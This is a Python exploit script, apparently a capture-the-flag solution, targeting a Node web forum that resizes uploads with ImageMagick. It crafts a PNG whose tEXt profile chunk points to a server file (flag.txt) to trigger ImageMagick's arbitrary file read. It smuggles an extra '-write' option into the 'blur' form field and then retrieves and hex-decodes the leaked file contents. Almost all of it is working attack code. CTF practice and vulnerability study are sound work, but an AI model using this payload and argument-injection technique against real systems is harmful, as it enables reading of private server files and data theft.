import requests
import png
import io
from PIL import Image, PngImagePlugin, ImageDraw

# FILE TO READ
TARGET_HOST = "localhost:1337"
# TARGET_HOST = "142.93.32.153:31969"
TARGET_FILE = "/home/node/app/flag.txt"

# generate payload png to target image magic v7.1.0
# arbitrary read a file when passed through convert. In our case we'll read TARGET_FILE
# https://www.metabaseq.com/imagemagick-zero-days/
info = PngImagePlugin.PngInfo()
info.add_text("profile", TARGET_FILE)
im = Image.new("RGB", (100, 100), (255, 255, 255))
ImageDraw.Draw(im).text((35, 40), 'PWNED', (0, 0, 0))
payload = io.BytesIO()  # buffer to write image paylaod into
im.save(payload, "PNG", pnginfo=info)
payload.seek(0) # so we can read the paylod
print(f"Payload generated")

session = requests.session()

# register and login user
burp0_data = {"username": "eximus", "password": "eximus"}
session.post(f"http://{TARGET_HOST}/auth/register", data=burp0_data)
session.post(f"http://{TARGET_HOST}/auth/login", data=burp0_data)

# here's the bypass for node's implementation of convert, the param to blur will be interpreted as another flag
# and using the -write flag we're able to save the as a PNG file still before it's converted and still exploit the imagemagik vulnerability of the tEXt chunk
burp0_data = {"title": "test", "message": "test",
              "blur": "20 -write uploads/pwned.png"}
files = {"image": ('payload.png', payload)}
res = session.post(f"http://{TARGET_HOST}/forum/post",
                   data=burp0_data, files=files)
print("Uploading payload:", res)

res = session.get(f"http://{TARGET_HOST}/uploads/pwned.png")

# read the content as a png
p = png.Reader(io.BytesIO(res.content))
flag = ""
for k, v in p.chunks():
  if k.decode() == 'tEXt' and v.startswith(b'Raw profile'):
      # skip header and decode flag
      print(bytes.fromhex(v[30:].decode()))
